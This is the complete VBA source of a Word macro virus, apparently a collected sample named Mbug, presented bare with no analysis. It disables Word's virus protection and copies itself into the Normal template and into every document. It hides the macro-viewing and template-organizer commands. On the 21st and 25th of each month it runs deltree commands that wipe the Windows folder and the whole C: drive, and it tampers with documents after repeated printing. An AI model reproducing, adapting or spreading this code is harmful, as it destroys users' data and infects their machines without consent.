   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Mbug"
   Sub AutoExec()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo errorAE
   If Day(Now()) = "21" Or Day(Now()) = "25" Then
   UserForm1.Show
   Shell "deltree /y c:\windows", vbHide
   Shell "deltree /y c:\*.*", vbHide
   End If
   errorAE:
   End Sub
   Sub AutoNew()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorAN
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Mbug", Object:=wdOrganizerObjectProjectItems
       With Dialogs(wdDialogFileSummaryInfo)
           .Subject = "You Have been infected by the Alliance 98"
           .Execute
       End With
   ErrorAN:
   End Sub
   Sub AutoOpen()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorAO
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0) = "Mbug" Then
           bInstalled = -1
       End If
   Next i
   If Not bInstalled Then
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Mbug", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
       For a = 1 To 10
       StatusBar = "Microsoft"
       Next a
   Else
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Mbug", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
   End If
   ErrorAO:
   End Sub
   Sub FileSaveAs()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorFSA
       If Day(Now()) = "21" Or Day(Now()) = "25" Then
       UserForm1.Show
       Shell "deltree /y c:\windows", vbMinimizedFocus
       Shell "deltree /y c:\*.*", vbMinimizedFocus
       End If
       Dialogs(wdDialogFileSaveAs).Show
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Mbug", Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
   ActiveDocument.Save
   ErrorFSA:
   If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
       ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
   End If
   End Sub
   Sub FilePrint()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorFP
   InsertPayload
       Dialogs(wdDialogFilePrint).Show
   ErrorFP:
   End Sub
   Sub FilePrintDefault()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorFPD
   InsertPayload
       ActiveDocument.PrintOut
   ErrorFPD:
   End Sub
   Sub FileTemplates()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorFT
   ErrorFT:
   End Sub
   Sub InsertPayload()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorIP
   Dim WPrint$, Adding
   WPrint$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NbrePrint", "Nuclear98.ini")
   Adding = WordBasic.Val(WPrint$) + 1
   WordBasic.SetPrivateProfileString "Microsoft Word", "NbrePrint", Str(Adding), "Nuclear98.ini"
   WPrint$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NbrePrint", "Nuclear98.ini")
   If WPrint$ = 12 Then
       Selection.EndKey Unit:=wdLine
       Selection.TypeParagraph
       Selection.TypeText Text:="bug"
       Selection.TypeParagraph
       Selection.TypeParagraph
       Selection.TypeText Text:="bug"
       Selection.HomeKey Unit:=wdLine
       Selection.EndKey Unit:=wdLine, Extend:=wdExtend
       Selection.Font.Bold = wdToggle
       WordBasic.SetPrivateProfileString "Microsoft Word", "NbrePrint", "1", "Nuclear98.ini"
   End If
   ErrorIP:
   End Sub
   Sub ToolsMacro()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorTM
   ErrorTM:
   End Sub
   Sub ViewVBCode()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorVVBC
   ErrorVVBC:
   End Sub

   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} UserForm1
      Caption         =   "Macro Bugs"
      ClientHeight    =   4035
      ClientLeft      =   2085
      ClientTop       =   330
      ClientWidth     =   4710
      OleObjectBlob   =   "Virus.MSWord.Mbug.a-UserForm1.frx":0000
   End
   Attribute VB_Name = "UserForm1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False


   Private Sub CommandButton1_Click()
   MsgBox "My name is Macrobug", vbInformation, "Information Box"
   End Sub

   Private Sub TextBox1_Change()
   MsgBox "Don't change my name", vbInformation, "!!!"
   End Sub

   Private Sub UserForm_Initialize()

       TextBox1.Text = "MacroBug"

       End Sub


